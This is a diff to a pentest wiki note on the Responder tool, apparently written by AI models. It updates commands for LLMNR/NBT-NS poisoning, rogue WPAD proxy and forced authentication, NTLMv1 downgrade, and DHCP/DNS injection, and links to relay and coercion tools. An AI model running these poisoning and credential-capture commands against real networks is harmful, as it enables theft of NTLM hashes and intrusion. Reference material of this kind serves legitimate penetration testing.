@@ -16,7 +16,7 @@ sudo responder -I tun0
 
 > [!note] **Responder + ntlmrelayx** — When SMB signing is disabled, don't just capture hashes — relay them for instant code execution. Run Responder with `-w -d` alongside ntlmrelayx. Set SMB and HTTP to Off in Responder.conf to avoid competing with the relay tool.
 
-> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Seamless SSO section, for capturing the NTLM hash triggered by the `autologon` endpoint.
+> [!note] **See also** — Windows-foothold counterpart (same poisoning attack, runs on a Windows host): [[Tools/Lateral Movement/inveigh|Inveigh]]. Relay instead of crack with [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]]; force auth on demand with [[Tools/Lateral Movement/Coercer|Coercer]]; passively sniff creds off the wire (no poisoning) with [[Tools/Network/PCredz|PCredz]]. Also [[Services/Active Directory/Entra ID|Entra ID]] Seamless SSO section (NTLM hash from the `autologon` endpoint). Protocol background: [[Standards & Protocols/NTLM|NTLM]].
 
 ---
 
@@ -30,16 +30,20 @@ sudo responder -I eth0
 # Verbose — show all requests (not just captures)
 sudo responder -I tun0 -v
 
-# Force WPAD proxy auth capture
+# Start the WPAD rogue proxy server (serves wpad.dat → clients auth to us)
 sudo responder -I tun0 -w
+# Force auth on the WPAD/proxy fetch (may pop a credential prompt on the client):
+sudo responder -I tun0 -w -F     # -F/--ForceWpadAuth ; or -P/--ProxyAuth (not with -w)
 
 # Force NTLM downgrade (capture NTLMv1 — easier to crack)
 sudo responder -I tun0 --lm
 
-# DNS spoofing
+# NOTE: LLMNR / NBT-NS / mDNS poisoning is ON by default — no flag needed.
+# -d is DHCP, not DNS: -d/--DHCP poisons DHCPv4 and injects WPAD in the lease.
 sudo responder -I tun0 -d
+# -D/--DHCP-DNS injects US as the DNS server via DHCP instead of WPAD.
 
-# WPAD + DNS + poisoning (aggressive — most captures)
+# Aggressive — default poisoning + WPAD server + DHCP injection + verbose
 sudo responder -I tun0 -w -d -v
 ```
 
@@ -171,5 +175,5 @@ sudo responder -I tun0 -A
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-29*
+*Model: claude-opus-5*
